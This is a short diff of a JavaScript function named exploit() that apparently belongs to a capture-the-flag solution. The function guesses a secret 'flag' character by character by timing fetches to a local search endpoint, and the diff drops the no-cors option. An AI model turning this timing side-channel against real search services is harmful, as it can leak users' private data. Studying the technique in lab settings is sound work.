@@ -6,9 +6,7 @@ async function exploit() {
         for (let word of wordlist){
             let query = flag + word;
             let start = performance.now();
-            await fetch(`http://127.0.0.1:12002/search?query=${query}`, {
-                mode:"no-cors"
-            })
+            await fetch(`http://127.0.0.1:12002/search?query=${query}`)
             let end = performance.now();
             let dur = end-start;
             if(dur >= 3000){
